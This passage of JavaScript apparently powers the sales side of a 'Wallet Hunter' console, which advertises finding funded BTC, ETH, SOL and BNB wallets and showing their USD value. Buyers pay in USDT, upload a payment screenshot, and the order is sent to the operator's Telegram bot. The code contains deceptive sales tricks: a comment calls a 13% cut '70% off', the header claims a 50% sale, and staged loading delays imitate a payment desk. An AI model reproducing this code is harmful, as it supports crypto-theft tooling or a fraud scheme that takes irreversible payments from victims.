   - Remove an offer: delete its entry from the OFFERS list.
   - Revert pricing : set OFFER_DISCOUNT to 1 - the original prices come
                      back and the strikethrough / sale tag disappear.
   - Current launch sale: OFFER_DISCOUNT = 0.5 -> every price is 50% off
                      and the original price is displayed struck through.
   - Promo codes    : a valid code from PROMO_CODES entered in the optional
                      checkout field takes a further PROMO_EXTRA_OFF percent
                      off the (already discounted) price.
==================================================================== */
const OFFER_DISCOUNT = 0.87;    /* 1 = original price | 0.87= 70% off */
const PROMO_EXTRA_OFF = 0.10;  /* extra 10% off with a valid promo code */

const OFFERS = [
  { name: '1-Month Trial', per: '/ 30 days',  dur: '30 days of access',  price: 114.00, featured: false, flag: '',
    feats: [ 'Full console access for 30 days', 'All target chains: BTC / ETH / SOL / BNB', 'Live USD value on every found wallet', 'Key delivered to your email within 1 hour', 'Telegram support included' ] },
  { name: '3-Month Plan',  per: '/ 90 days',  dur: '90 days of access',  price: 228.00, featured: true, flag: 'MOST POPULAR',
    feats: [ 'Full console access for 90 days', 'All target chains: BTC / ETH / SOL / BNB', 'Live USD value on every found wallet', 'Key delivered to your email within 1 hour', 'Telegram support included' ] },
  { name: '1-Year Plan',   per: '/ 365 days', dur: '365 days of access', price: 594.00, featured: true, flag: 'BEST VALUE',
    feats: [ 'Full console access for 365 days', 'All target chains: BTC / ETH / SOL / BNB', 'Live USD value on every found wallet', 'Key delivered to your email within 1 hour', 'Telegram support included' ] },
];

/* 30 promo codes (matched case-insensitively at checkout) */
const PROMO_CODES = [
  '29X71W71', '2YIXQYXX', '3JR4AYSL', '559H8D5L', '61STOUOB',
  '62FP2AT0', '7EHMANFC', '7YPFAKHG', '9BEM5ZAA', 'CUOQNVAP',
  'D98J209Q', 'EL64PZU7', 'FV66WZ6K', 'GWQBGO2G', 'JC9DC05Z',
  'KIRFXPC9', 'L415RQXV', 'LETBM7D9', 'PWWPUH0X', 'Q09GOTLP',
  'QLIQM551', 'R8VSGMP6', 'S7LKD37L', 'SEC0DJT6', 'SINI789Y',
  'TN7JU98T', 'TU3DCZMF', 'WGFDMS6U', 'WPAD7A0E', 'XW8DJR3C',
];

let promoApplied = false, promoUsed = '';

const money = n => '$' + (Math.round(n * 100) / 100).toFixed(2);
function offerPrice(o, promo){        /* final price (USD) for offer o */
  let v = o.price * OFFER_DISCOUNT;
  if (promo) v *= (1 - PROMO_EXTRA_OFF);
  return Math.round(v * 100) / 100;
}

/* struck-through original price + sale pill (shown only while OFFER_DISCOUNT < 1) */
function priceHtml(o, promo){
  const struck = OFFER_DISCOUNT < 1 ? '<s>' + money(o.price) + '</s> ' : '';
  const tag = OFFER_DISCOUNT < 1 ? '<span class="off-tag">' + Math.round((1 - OFFER_DISCOUNT) * 100) + '% OFF</span>' : '';
  return struck + money(offerPrice(o, promo)) + (tag ? ' ' + tag : '');
}

function renderPayPrice(){            /* checkout price + exact amount to send */
  const o = OFFERS[pickedPlan];
  $('pyPlanPrice').innerHTML = priceHtml(o, promoApplied) + ' <span>USDT &middot; BEP-20</span>';
  $('pyAmt').textContent = money(offerPrice(o, promoApplied)) + ' USDT';
}

/* plans page cards are rendered from OFFERS (script-managed) */
function buildOffers(){
  const wrap = $('plGrid');
  wrap.innerHTML = OFFERS.map((o, i) =>
    '<div class="pl-card' + (o.featured ? ' featured' : '') + '">' +
    (o.flag ? '<div class="pl-flag">' + o.flag + '</div>' : '') +
    '<div class="pl-name">' + o.name + '</div>' +
    '<div class="pl-price">' + priceHtml(o, false) + ' <span>' + o.per + '</span></div>' +
    '<ul class="pl-feats">' + o.feats.map(f => '<li>' + f + '</li>').join('') + '</ul>' +
    '<button class="btn btn-primary pl-pick" data-plan="' + i + '">Select Plan</button>' +
    '</div>'
  ).join('');
  wrap.querySelectorAll('.pl-pick').forEach(b => b.addEventListener('click', () => openPay(parseInt(b.dataset.plan, 10))));
}

/* the "from $X" figure on the login button follows the lowest offer price */
function updateFromPrice(){
  $('lgFrom').textContent = money(Math.min.apply(null, OFFERS.map(o => offerPrice(o, false))));
}

/* optional promo field on the checkout page - submitted with the Apply button */
function applyPromo(){
  const code = $('pyPromo').value.trim().toUpperCase();
  const msg = $('pyPromoMsg');
  const prev = offerPrice(OFFERS[pickedPlan], promoApplied);
  promoUsed = '';
  if (!code){
    promoApplied = false;
    msg.style.display = 'none';
  } else if (PROMO_CODES.indexOf(code) !== -1){
    promoApplied = true;
    promoUsed = code;
    msg.textContent = 'Promo code accepted - extra ' + Math.round(PROMO_EXTRA_OFF * 100) + '% off applied.';
    msg.className = 'py-promo-msg ok';
    msg.style.display = 'block';
  } else {
    promoApplied = false;
    msg.textContent = 'Invalid promo code - the price stays as shown.';
    msg.className = 'py-promo-msg bad';
    msg.style.display = 'block';
    const inp = $('pyPromo');
    inp.classList.remove('bad'); void inp.offsetWidth; inp.classList.add('bad');
    setTimeout(() => inp.classList.remove('bad'), 420);
  }
  renderPayPrice();
  const now = offerPrice(OFFERS[pickedPlan], promoApplied);
  if (now < prev) playPriceDrop(prev, now);   /* animated price decrease */
}
$('pyPromoBtn').addEventListener('click', applyPromo);
$('pyPromo').addEventListener('keydown', e => { if (e.key === 'Enter'){ e.preventDefault(); applyPromo(); } });
$('pyPromo').addEventListener('input', () => {  /* editing the field clears an applied promo until Apply is pressed again */
  $('pyPromo').classList.remove('bad');
  if (promoApplied && $('pyPromo').value.trim().toUpperCase() !== promoUsed){
    promoApplied = false; promoUsed = '';
    $('pyPromoMsg').style.display = 'none';
    renderPayPrice();
  }
});

/* animated price decrease when a valid promo code is submitted */
function playPriceDrop(from, to){
  const amt = $('pyAmt'), box = $('pyPlanPrice');
  [box, amt].forEach(el => { el.classList.remove('price-drop'); void el.offsetWidth; el.classList.add('price-drop'); });
  const chip = document.createElement('span');
  chip.className = 'promo-save-chip';
  chip.textContent = '-' + Math.round(PROMO_EXTRA_OFF * 100) + '%';
  box.appendChild(chip);
  setTimeout(() => chip.remove(), 1300);
  const t0 = performance.now(), DUR = 700;
  (function roll(){
    const k = Math.min(1, (performance.now() - t0) / DUR);
    const e2 = 1 - Math.pow(1 - k, 3);          /* ease-out cubic */
    amt.textContent = money(from + (to - from) * e2) + ' USDT';
    if (k < 1) requestAnimationFrame(roll);
  })();
}
let pickedPlan = 0;
let proofFile  = null;
let sendingOrder = false;

const plansPage = $('plansPage'), payPage = $('payPage');
const pageLoading = $('pageLoading'), ldText = $('ldText');

function showGateView(el){          /* el: gate | plansPage | payPage | null */
  gate.classList.toggle('hide', el !== gate);
  plansPage.style.display = el === plansPage ? '' : 'none';
  payPage.style.display   = el === payPage   ? '' : 'none';
}

function openPlans(){ showGateView(plansPage); window.scrollTo(0, 0); }

function startPrepare(){           /* ~3s "System is preparing..." before unlock */
  gate.classList.add('prep');
  setLgState('PREPARING\u2026');
  setTimeout(() => { gate.classList.remove('prep'); unlockApp(); }, 3000);
}

function resetPayForm(){
  $('pyPromo').value = '';
  $('pyPromoMsg').style.display = 'none';
  promoApplied = false; promoUsed = '';
  $('pyEmail').value = '';
  $('pyEmail').classList.remove('bad');
  $('pyEmailErr').style.display = 'none';
  proofFile = null;
  $('pyFile').value = '';
  $('pyFname').style.display = 'none';
  $('pyFileErr').style.display = 'none';
  $('pyAddr').classList.remove('copied');
  $('pyCopied').classList.remove('show');
  document.querySelector('.py-grid').style.display = '';
  $('pySuccess').style.display = 'none';
  $('payTitle').textContent = 'Complete Your Payment';
  const btn = $('pySubmit');
  btn.disabled = false;
  btn.textContent = 'Submit Order';
}

function openPay(i){
  pickedPlan = i;
  const p = OFFERS[i];
  $('pyPlanName').textContent = p.name;
  $('pyPlanDur').textContent = p.dur;
  resetPayForm();        /* clears fields and any promo state */
  renderPayPrice();      /* price + amount follow the discount and promo */
  showGateView(null);
  pageLoading.style.display = 'flex';
  ldText.textContent = 'Preparing your order\u2026';
  setTimeout(() => { ldText.textContent = 'Contacting the payment desk\u2026'; }, 800);
  setTimeout(() => { ldText.textContent = 'Almost ready\u2026'; }, 1500);
  setTimeout(() => {
    pageLoading.style.display = 'none';
    showGateView(payPage);
    window.scrollTo(0, 0);
  }, 1800 + Math.floor(Math.random() * 1100));   /* 1.8-2.9s transition */
}

function copyPayAddress(){
  const flash = () => {
    $('pyAddr').classList.add('copied');
    $('pyCopied').classList.add('show');
    setTimeout(() => {
      $('pyAddr').classList.remove('copied');
      $('pyCopied').classList.remove('show');
    }, 2200);
  };
  const fallback = () => {
    const ta = document.createElement('textarea');
    ta.value = PAY_WALLET;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand('copy'); } catch(_){}
    ta.remove();
  };
  if (navigator.clipboard && navigator.clipboard.writeText){
    navigator.clipboard.writeText(PAY_WALLET).then(flash).catch(() => { fallback(); flash(); });
  } else { fallback(); flash(); }
}

function validEmail(s){
  const at = s.indexOf('@');
  if (at < 1 || s.indexOf('@', at + 1) !== -1) return false;
  const dom = s.slice(at + 1);
  const dot = dom.lastIndexOf('.');
  return dot > 0 && dot < dom.length - 1 && s.indexOf(' ') === -1;
}

async function submitOrder(){
  if (sendingOrder) return;
  const email = $('pyEmail').value.trim();
  const okEmail = validEmail(email);
  $('pyEmail').classList.toggle('bad', !okEmail);
  $('pyEmailErr').style.display = okEmail ? 'none' : 'block';
  const okFile = !!proofFile;
  $('pyFileErr').style.display = okFile ? 'none' : 'block';
  if (!okEmail || !okFile) return;

  sendingOrder = true;
  const btn = $('pySubmit');
  btn.disabled = true;
  btn.textContent = 'Sending order\u2026';

  const p = OFFERS[pickedPlan];
  const text =
    'NEW ORDER \u2014 Wallet Hunter Access\n' +
    'Plan: ' + p.name + '\n' +
    'Price: ' + money(offerPrice(p, promoApplied)) + ' USDT (BEP-20)\n' +
    'Promo code: ' + (promoUsed || 'none') + '\n' +
    'Pay to: ' + PAY_WALLET + '\n' +
    'Buyer email: ' + email + '\n' +
    'Proof of payment: ' + (proofFile ? proofFile.name : 'attached') + '\n' +
    'Time: ' + new Date().toLocaleString('en-GB', { hour12: false });

  const api = 'https://api.telegram.org/bot' + BOT_TOKEN;
  const withTimeout = (pr, ms) => Promise.race([pr, new Promise(res => setTimeout(() => res(null), ms))]);
  try {
    let ok = false;
    try {
      const fd = new FormData();
      fd.append('chat_id', BOT_CHAT);
      fd.append('caption', text);
      fd.append('photo', proofFile);
      const r = await withTimeout(fetch(api + '/sendPhoto', { method: 'POST', body: fd }), 20000);
      ok = !!(r && r.ok);
    } catch(_){}
    if (!ok){   /* fall back to a text-only notification */
      try {
        const r2 = await withTimeout(fetch(api + '/sendMessage', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: BOT_CHAT, text: text + '\n(screenshot could not be uploaded \u2014 ask the buyer for it)' })
        }), 15000);
        ok = !!(r2 && r2.ok);
      } catch(_){}
    }
  } catch(_){}

  await new Promise(res => setTimeout(res, 1400));   /* keep the sending animation visible */
  $('pySuccEmail').textContent = email;
  document.querySelector('.py-grid').style.display = 'none';
  $('payTitle').textContent = 'Order Received';
  $('pySuccess').style.display = 'block';
  window.scrollTo(0, 0);
  sendingOrder = false;
  btn.disabled = false;
  btn.textContent = 'Submit Order';
}

/* wiring */
$('lgPlansBtn').addEventListener('click', openPlans);
$('plansBack').addEventListener('click', () => showGateView(gate));
buildOffers();       /* plan cards rendered from the OFFERS list */
updateFromPrice();   /* login "from $X" follows the discount */
$('payBack').addEventListener('click', () => showGateView(plansPage));
$('pyAddr').addEventListener('click', copyPayAddress);
$('pyFile').addEventListener('change', e => {
  const f = e.target.files && e.target.files[0];
  proofFile = f || null;
  if (f){
    $('pyFname').textContent = '\u2713 ' + f.name + ' (' + Math.max(1, Math.round(f.size / 1024)) + ' KB)';
    $('pyFname').style.display = 'block';
    $('pyFileErr').style.display = 'none';
  } else {
    $('pyFname').style.display = 'none';
  }
});
$('pySubmit').addEventListener('click', submitOrder);
$('pyDone').addEventListener('click', () => { resetPayForm(); showGateView(gate); });

/* ================= Online-only guard ================= */
/* Wallet Hunter functions only with an active internet connection.
   The moment connectivity drops, the console closes behind a full-screen
   notice; it reopens automatically once the connection is restored. */
const offGate = $('offlineGate');
const offStateText = $('offStateText');
let offlineActive = false;
let offlineChecking = false;
let offProbeTimer = null;
let scanWasRunning = false;

function setOffState(t){ offStateText.textContent = t; }

function showOfflineGate(){
  if (offlineActive) return;
  offlineActive = true;
  scanWasRunning = (state === 'running');
  try { stopEngine(); } catch(_){}
  try { if (document.activeElement && document.activeElement.blur) document.activeElement.blur(); } catch(_){}
  document.body.classList.add('app-offline');
  offGate.style.display = 'flex';
  setOffState('Waiting for connection\u2026');
  if (!offProbeTimer) offProbeTimer = setInterval(tryComeBack, 5000);
}

async function netReachable(){
  /* Any HTTP response (even an error status) proves the network is up */
  const base = toRawUrl(KEYS_URL);
  const url = base + (base.indexOf('?') === -1 ? '?' : '&') + 'probe=' + Date.now();
  try {
    const ctl = ('AbortController' in window) ? new AbortController() : null;
    const to = ctl ? setTimeout(() => ctl.abort(), 7000) : null;
    await fetch(url, { cache: 'no-store', signal: ctl ? ctl.signal : undefined });
    if (to) clearTimeout(to);
    return true;
  } catch(_){ return false; }
}

async function tryComeBack(){
  if (!offlineActive || offlineChecking) return;
  offlineChecking = true;
  setOffState('Checking connection\u2026');
  const ok = await netReachable();
  offlineChecking = false;
  if (!ok) setOffState('Still offline \u2014 waiting for connection\u2026');
  else closeOfflineGate();
}

function closeOfflineGate(){
  offlineActive = false;
  if (offProbeTimer){ clearInterval(offProbeTimer); offProbeTimer = null; }
  offGate.style.display = 'none';
  document.body.classList.remove('app-offline');
  /* fail-closed: instantly re-verify the saved key against the live list */
  if (sessionKey) recheckKey();
  try { fetchPrices(); } catch(_){}
  if (scanWasRunning && sessionKey){
    scanWasRunning = false;
    setStatus('running');
    startEngine();
    addLog('<span class="t">[' + ts() + ']</span> [system] Back online \u2014 scan resumed.', 'sys');
  } else {
    scanWasRunning = false;
    addLog('<span class="t">[' + ts() + ']</span> [system] Back online.', 'sys');
  }
}

$('offRetry').addEventListener('click', tryComeBack);
window.addEventListener('offline', showOfflineGate);
window.addEventListener('online', tryComeBack);
/* safety net for browsers that miss the connection events */
setInterval(() => { if (!navigator.onLine) showOfflineGate(); }, 3000);
/* the app is online-only from the very first load */
if (!navigator.onLine) showOfflineGate();
